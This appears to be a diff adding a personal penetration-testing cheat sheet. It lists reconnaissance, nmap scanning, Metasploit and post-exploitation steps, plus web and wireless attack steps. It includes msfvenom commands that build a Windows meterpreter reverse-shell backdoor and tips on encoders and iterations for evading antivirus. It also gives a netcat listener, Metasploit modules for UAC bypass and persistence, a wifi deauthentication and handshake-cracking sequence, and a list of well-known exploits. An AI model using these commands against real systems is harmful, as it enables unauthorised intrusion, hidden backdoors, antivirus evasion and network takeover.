@@ -1,0 +1,112 @@
+I.Reconnaissance & Information Gathering
+    1.whatweb - information about web app 
+    2. theHarvester - links mails ..
+    3. RED HAWK
+    4. SHERLOCk
+
+II. Scanning
+    1. ARP tool 
+        * arp -a
+    2. netdiscover
+        * sudo netdiscover
+    3. nmap
+        * nmap $IP$
+        * nmap $192.168.1.1/24$
+        * nmap -sS $IP$ - popular scan 
+        * nmap -O $IP$
+        * nmap -sV $IP$ - inforamtion of versions
+        * nmap -A $IP$ - all infomations aggresive scan
+        * nmap -sn $IP-255$ - show wich ports opens
+        * nmap -p  80 $IP$ - scan spesific port
+        * nmap $IP$ >> outputfile.txt - save to file the scanning
+    
+        HAVE firewall ? -> 
+            *nmap -f $IP$
+            * nmap --mtu $IP$
+    
+    4.Metasploit
+        *auxxiliary modules ->
+            * use auxxiliary/scanner/$name$
+            example use auxxiliary/scanner/smb/smb_version - look the smb version the target
+
+III. Vulnerabulity analysis 
+    1.nmap tool
+    2.Nessuss app 
+
+IV. Gaining Access
+    # nc -lvp 4444 - listen port
+    1.Metasploit
+        * msfconsole
+        * searchsploit $name of version or name$
+        * msf> search $name$
+        # bruteforce attacks
+            * ssh -> use  auxiliary/scanner/ssh/ssh_login
+        # msfvenom - to create backdoors (msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe -o shell.exe) -> and listen port 
+            * msfvenom --list encoders (use encoders to bypass untiviruses) 
+            * use iterrations to bypass untiviruses to 
+            * exmaple -> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -a x64 -e x64/zutto_dekiru -i 15 --platform windows -n 500 -f exe -o shell.exe
+            * can use " -x " to set shell in program (not works in all programs working example putty)
+            * to create udetactable backdoor is two ways to write your own code backdoor or to change the with hexeditor tool the hex file
+
+    2. nc -  tool (if the target have tcp/udp connection like bind shell)
+        * nc $IP PORT$
+    3 - telnet - tool for connection (username password)
+        * telnet $IP$
+
+    4.routersploit -> router attack sploit
+        * search scanners
+        * use scanners/autopwn
+        * set target $IP$ -> run
+    5.veil -> payload tool (but need to convert from bat to exe file program)
+    6.the fat rat -> payload tool
+
+V.Post Exploitation 
+    1.meterpreter
+        # get root privileges 
+            *   windows/local/bypassuac_injection
+        
+        # persistence
+            *windows/local/persistence_service
+        
+        # modueles 
+            * search -h (search -f * .jpg)
+            * search post/windows - (list of all post explotation modules )
+
+        # keyloggers 
+            *
+
+==============================================================================================================================
+WEB pentesting
+
+1. dirb tool - find all hidden urls  (dirb $URL$)
+2. burpsuite - the main tool for web pentesting
+
+==============================================================================================================================
+Network attack
+
+I.MITM
+    1.bettercap ARP -  apt-get install bettercap
+        #bettercap -> help
+    2.Ettercap 
+
+II.WIrseless attack 
+    1.airmon-ng ->
+        *ifconfig wlo1 down
+        *iwconfig wlo1 mode monitor
+        *ifconfig wlo1 up
+        *airmon-ng check wlo1
+        *airodump-ng wlo1 - get all in diapason WIrseless wifi
+        *airodump-ng -c 2 --bssid $BSSID$ -w $NAME$ wlo1 - all connection to this network
+        *aireplay -ng -0 0 -a BSSID wlo1 - deauthenicate the "phone from network"
+        *aircrack-ng -w rockyou.txt $THE_FILE_OF_NET_.cap"
+    1.hashcat - hack from video_card and not cpu (faster bruteforce)
+
+
+
+
+
+//top exploits
+1.enternalblue - for windows
+2.BlueKeep
+3. SMBGhost CVE 2020-0796 - Windows 10 Manual Exploitation
+4. shellShock -2014
